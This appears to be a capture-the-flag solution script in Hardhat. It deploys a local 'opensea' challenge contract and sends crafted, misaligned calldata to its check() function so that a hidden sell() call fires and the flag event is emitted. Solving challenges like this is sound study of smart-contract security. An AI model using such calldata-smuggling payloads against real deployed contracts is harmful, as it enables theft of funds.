const { expect } = require("chai");
const { ethers } = require("hardhat");

async function deploy(deployer) {
  const Opensea = await ethers.getContractFactory("opensea", deployer);
  const opensea = await Opensea.deploy();

  console.log("Opensea contract:", opensea.address);

  return opensea;
}

async function exploit(attacker, target) {
  // True Ployload
  // await target.connect(attacker).check(
  //     "0xcce7ec130000000000000000000000003245772623316e2562d90e642bb538e48996ec67000000000000000000000000000000000000000000000000000000000000000f",
  //     "0x00000000ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0000000000000000000000000000000000000000000000000000000000000000",
  //     "0x",
  //     "0xcce7ec130000000000000000000000003245772623316e2562d90e642bb538e48996ec67000000000000000000000000000000000000000000000000000000000000000f"
  // )
  // Malicious  Ployload
  await expect(
    target.connect(attacker).check(
      "0xcce7ec130000000000000000000000003245772623316e2562d90e642bb538e4",
      "0x8996ec6700000000000000000000000000000000000000000000000000000000",
      "0x0000000f00000000ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0000000000000000000000000000000000000000000000000000000000000000",
      //abi.encodeWithSignature("sell()")
      "0x4571007400000000000000000000000000000000000000000000000000000000"
    )
  )
    .to.emit(target, "sendflag")
    .withArgs(
      "0x20bb353f6ca259a92ff74a4f127403e699620d4b68d890c130518feef9b3799b"
    );
}

async function main() {
  let [deployer, attacker] = await ethers.getSigners();
  let opensea = await deploy(deployer);

  await exploit(attacker, opensea);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
